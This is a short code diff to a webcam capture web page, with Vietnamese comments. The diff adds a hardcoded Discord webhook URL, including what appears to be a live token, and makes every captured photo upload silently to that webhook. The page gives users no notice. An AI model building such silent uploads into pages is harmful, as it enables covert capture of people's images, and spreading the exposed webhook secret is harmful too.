@@ -23,6 +23,9 @@
     <img id="photo" alt="Chụp ảnh" />
 
     <script>
+        // Thay đổi webhook URL ở đây
+        const webhookUrl = 'https://discord.com/api/webhooks/1244143482591907953/vdZq7ZJIjnmJ_mFoQGDGN_AwAwdqQHqTRqy9V9p7ZLsddolQchX82v3PlVSpHKg9FCKN'; // Thay thế bằng URL webhook của bạn
+
         // Lấy các phần tử
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -38,13 +41,34 @@
                 console.error("Không thể truy cập webcam: ", err);
             });
 
-        // Chức năng chụp ảnh
+        // Chức năng chụp ảnh và gửi ảnh qua webhook
         captureButton.addEventListener('click', () => {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            photo.src = canvas.toDataURL('image/png');
+            
+            const imageData = canvas.toDataURL('image/png');
+            photo.src = imageData;
+
+            // Gửi ảnh qua webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Ảnh đã được gửi thành công!');
+                } else {
+                    console.error('Lỗi khi gửi ảnh:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Lỗi mạng:', error);
+            });
         });
     </script>
 </body>
